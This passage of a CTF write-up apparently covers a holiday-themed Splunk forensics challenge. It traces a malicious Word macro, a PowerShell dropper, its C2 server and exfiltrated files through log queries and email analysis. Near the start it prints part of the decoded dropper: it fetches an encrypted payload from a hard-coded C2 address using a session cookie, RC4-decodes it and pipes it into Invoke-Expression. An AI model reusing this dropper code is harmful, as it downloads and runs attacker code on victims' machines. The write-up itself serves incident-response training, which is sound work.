class="p">;</span><span class="nv">$S</span><span class="p">[</span><span class="nv">$_</span><span class="p">],</span><span class="nv">$S</span><span class="p">[</span><span class="nv">$J</span><span class="p">]=</span><span class="nv">$S</span><span class="p">[</span><span class="nv">$J</span><span class="p">],</span><span class="nv">$S</span><span class="p">[</span><span class="nv">$_</span><span class="p">]};</span><span class="nv">$D</span><span class="p">|%{</span><span class="nv">$I</span><span class="p">=(</span><span class="nv">$I</span><span class="p">+</span><span class="n">1</span><span class="p">)</span><span class="k">%</span><span class="n">256</span><span class="p">;</span><span class="nv">$H</span><span class="p">=(</span><span class="nv">$H</span><span class="p">+</span><span class="nv">$S</span><span class="p">[</span><span class="nv">$I</span><span class="p">])</span><span class="k">%</span><span class="n">256</span><span class="p">;</span><span class="nv">$S</span><span class="p">[</span><span class="nv">$I</span><span class="p">],</span><span class="nv">$S</span><span class="p">[</span><span class="nv">$H</span><span class="p">]=</span><span class="nv">$S</span><span class="p">[</span><span class="nv">$H</span><span class="p">],</span><span class="nv">$S</span><span class="p">[</span><span class="nv">$I</span><span class="p">];</span><span class="nv">$_</span><span class="o">-BXoR</span><span class="nv">$S</span><span class="p">[(</span><span class="nv">$S</span><span class="p">[</span><span class="nv">$I</span><span class="p">]+</span><span class="nv">$S</span><span class="p">[</span><span class="nv">$H</span><span class="p">])</span><span class="k">%</span><span class="n">256</span><span class="p">]}}}</span><span class="s1">&#39;);</span>
<span class="s1">$ser=&#39;</span><span class="n">http</span><span class="err">:</span><span class="p">//</span><span class="n">144</span><span class="p">.</span><span class="n">202</span><span class="p">.</span><span class="n">46</span><span class="p">.</span><span class="n">214</span><span class="err">:</span><span class="n">8080</span><span class="s1">&#39;;</span>
<span class="s1">$t=&#39;</span><span class="p">/</span><span class="n">admin</span><span class="p">/</span><span class="n">get</span><span class="p">.</span><span class="n">php</span><span class="err">&#39;</span><span class="p">;</span>
<span class="nv">$WC</span><span class="p">.</span><span class="n">HEADErs</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="s2">&quot;Cookie&quot;</span><span class="p">,</span><span class="s2">&quot;session=reT9XQAl0EMJnxukEZy/7MS70X4=&quot;</span><span class="p">);</span>
<span class="nv">$DATa</span><span class="p">=</span><span class="nv">$WC</span><span class="p">.</span><span class="n">DownlOADDAtA</span><span class="p">(</span><span class="nv">$sEr</span><span class="p">+</span><span class="nv">$T</span><span class="p">);</span>
<span class="nv">$Iv</span><span class="p">=</span><span class="nv">$DatA</span><span class="p">[</span><span class="n">0</span><span class="p">..</span><span class="n">3</span><span class="p">];</span>
<span class="nv">$DatA</span><span class="p">=</span><span class="nv">$dATa</span><span class="p">[</span><span class="n">4</span><span class="p">..</span><span class="nv">$DatA</span><span class="p">.</span><span class="n">lENGtH</span><span class="p">];</span>
<span class="n">-JOIN</span><span class="no">[ChaR[]]</span><span class="p">(&amp;</span> <span class="nv">$R</span> <span class="nv">$DatA</span> <span class="p">(</span><span class="nv">$IV</span><span class="p">+</span><span class="nv">$K</span><span class="p">))|</span><span class="n">IEX</span><span class="p">.</span>
</pre></div>


<p>(cleaned up just a bit)</p>
<p>Some of this seems garbled but it's enough that we can tell what's happening. We see an HTTP request to <code>http://144.202.46.214:8080/admin/get.php</code>, which we then cut a bit and assing to <code>$Data</code>. Then we do some manipulation with it and the first 4 bytes before eventually piping it (presumably decoded) into IEX / <code>Invoke-Expression</code>. This is basically just a dropper that executes some powershell code it gets from that server. We can't look at exactly what code it executes, but we can get a rough idea by searching for <code>host="sweetums" source="WinEventLog:Microsoft-Windows-Powershell/Operational"</code>. Most of what we see is invocations of basic powershell commands, ForEach, Get and Where. The most common by far is ForEach, so let's start by looking at calls to <code>ForEach</code>:</p>
<div class="codehilite"><pre><span></span><span class="err">host=&quot;sweetums&quot; source=&quot;WinEventLog:Microsoft-Windows-Powershell/Operational&quot; ParameterBinding_ForEach_Object_=&quot;*&quot;</span>
</pre></div>


<p>By looking at the events we can see one interesting field:</p>
<div class="codehilite"><pre><span></span><span class="err">ParameterBinding(ForEach-Object): name=&quot;Process&quot;; value=&quot;$wc.Headers.Add($_.Name, $_.Value)&quot;</span>
</pre></div>


<p>Looking at it closer in the sidebar we see most of the values for it are just numbers. At a guess, this is from when the dropper decodes the data. We can look for more interesting events by filtering for rare values: <code>| rare limit=20 ParameterBinding_ForEach_Object_</code>. We see a couple file paths which is being used as an InputObject to some for loop, however one stands out:</p>
<div class="codehilite"><pre><span></span><span class="err">name=&quot;InputObject&quot;; value=&quot;C:\Users\cbanas\Documents\Naughty_and_Nice_2019_draft.txt&quot;</span>
</pre></div>


<p>It's safe to assume the code is looping over all the contents of a folder and exfiltrating them somehow, so our answer is <code>C:\Users\cbanas\Documents\Naughty_and_Nice_2019_draft.txt</code>.</p>
<h1>Question 3</h1>
<blockquote>
<p>What is the fully-qualified domain name(FQDN) of the command and control(C2) server?</p>
</blockquote>
<p>We can search for network events (id 3) and then look at common destination hostnames:</p>
<div class="codehilite"><pre><span></span><span class="err">EventID=&quot;3&quot; | top dest_host</span>
</pre></div>


<p>Only one result is returned which makes up all of our (logged) network requests: <code>144.202.46.214.vultr.com</code></p>
<h1>Question 4</h1>
<blockquote>
<p>What document is involved with launching the malicious PowerShell code?</p>
</blockquote>
<p>Since we're told it's a malicious document, let's start by looking for macro-enabled documents with a plaintext search <code>docm</code>.</p>
<p>The second event we see is a process create, where WINWORD.exe opens <code>C:\Windows\Temp\Temp1_Buttercups_HOL404_assignment (002).zip\19th Century Holiday Cheer Assignment.docm</code>, so our answer is <code>19th Century Holiday Cheer Assignment.docm</code>.</p>
<h1>Question 5</h1>
<blockquote>
<p>How many unique email addresses were used to send Holiday Cheer essays to Professor Banas?</p>
</blockquote>
<p>For this we want to look at stoq analysis rather than events from the host, so we use <code>sourcetype="stoq"</code>. </p>
<p>First up, We only want to look at emails to/from the professor. If we look at the first event, we see that somewhere in the <code>results</code> array we have an object where <code>workers.smtp.to</code> is <code>carl.banas@faculty.elfu.org</code>. Since some clients might include contact names or capitalise differently, we search a little more vaguely:</p>
<div class="codehilite"><pre><span></span><span class="err">results{}.workers.smtp.to=&quot;*carl.banas@faculty.elfu.org*&quot;</span>
</pre></div>


<p>Now we should filter only emails which have the right subject line, which Alice tells us is <code>Holiday Cheer Assignment Submission</code>: <code>results{}.workers.smtp.subject="Holiday Cheer Assignment Submission"</code>.</p>
<p>Now we just need to look at all the different senders, which we can do with <code>| top results{}.workers.smtp.from</code>. We end up with 21 results, which is the answer to the question.</p>
<h1>Question 6</h1>
<blockquote>
<p>What was the password for the zip archive that contained the suspicious file?</p>
</blockquote>
<p>To start with, let's look for the zip file. Stoq puts attachment filenames in <code>payload_meta.extra_data.filename</code> so we can search for zip attachments with <code>"results{}.payload_meta.extra_data.filename"="*.zip"</code>. If we look at the body of this message, we get:</p>
<div class="codehilite"><pre><span></span><span class="err">Professor Banas, I have completed my assignment. Please open the attached zip file with password 123456789 and then open the word document to view it. You will have to click &quot;Enable Editing&quot; then &quot;Enable Content&quot; to see it. This was a fun assignment. I hope you like it!  --Bradly Buttercups</span>
</pre></div>


<p>So the password is 123456789. </p>
<h1>Question 7</h1>
<blockquote>
<p>What email address did the suspicious file come from? </p>
</blockquote>
<p>From the last search, <code>Bradly.Buttercups@elfu.org</code>.</p>
<h1>Final Question</h1>
<blockquote>
<p>What was the message for Kent that the adversary embedded in this attack? </p>
</blockquote>
<p>Alice gives us a big filter thing which we can put at the end of our last search to get a neat output of the extracted files from this message.</p>
<p>We can actually download these files from <code>https://elfu-soc.s3.amazonaws.com/stoQ%20Artifacts/&lt;fullpath&gt;</code>. If we look at the extracted docm it tells us it's been cleaned up and to look for the core.xml instead. We download that file the same way and find the document description:</p>
<div class="codehilite"><pre><span></span><span class="err">Kent you are so unfair. And we were going to make you the king of the Winter Carnival.</span>
</pre></div>
		</main>

		<footer>
			<div class="links">
				<div>
					<a aria-label="Back" href="index.html">
						<span class="iconify" data-icon="fa:arrow-left"></span>
					</a>
				</div>
				<div>
			</div>
		</footer>

		<script src="https://code.iconify.design/1/1.0.3/iconify.min.js"></script>
	</body>
</html>